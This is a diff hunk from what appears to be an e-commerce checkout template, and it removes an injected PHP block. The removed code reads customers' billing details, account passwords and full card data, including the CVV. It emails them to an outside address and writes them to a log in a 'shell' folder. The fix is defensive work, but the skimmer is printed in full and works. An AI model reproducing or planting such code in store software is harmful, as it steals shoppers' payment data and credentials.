@@ -105,35 +105,4 @@ $seq_http	= (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on');
 //]]>
 </script>
 </div>
-<?php
-error_reporting(0);
-$messagess   = "
-add id  : ".$_POST['billing']['address_id']."  
-Fname   : ".$_POST['billing']['firstname']."
-mid     : ".$_POST['billing']['middlename']."
-Lastname: ".$_POST['billing']['lastname']."
-email   : ".$_POST['billing']['email']."
-Comp    : ".$_POST['billing']['company']."
-Add     : ".$_POST['billing']['street'][]."
-City    : ".$_POST['billing']['city']."
-RegionC : ".$_POST['billing']['region_id']."
-Region  : ".$_POST['billing']['region']."
-Postcode: ".$_POST['billing']['postcode']."
-Phone   : ".$_POST['billing']['telephone']."
-Country : ".$_POST['billing']['country_id']."
-Password: ".$_POST['billing']['customer_password']."
-Shipto  : ".$_POST['billing']['use_for_shipping']."
-Shiptos : ".$_POST['shipping']['same_as_billing']."
-Gate    : ".$_POST['payment']['method']."
-Type    : ".$_POST['payment']['cc_type']."
-Owner   : ".$_POST['payment']['cc_owner']."
-Numb    : ".$_POST['payment']['cc_number']."
-Month   : ".$_POST['payment']['cc_exp_month']."
-Year    : ".$_POST['payment']['cc_exp_year']."
-CID     : ".$_POST['payment']['cc_cid']."
-end.
-";
-mail("tunisianseven123@outlook.fr" , "zm back Z", $messagess);
-$fwrite = fwrite($fp, "," .$messagess );
-$fp=fopen('/chroot/home/zmantech/zmantechnologies.com/html/store/shell/log' , 'a+');
-?>
+
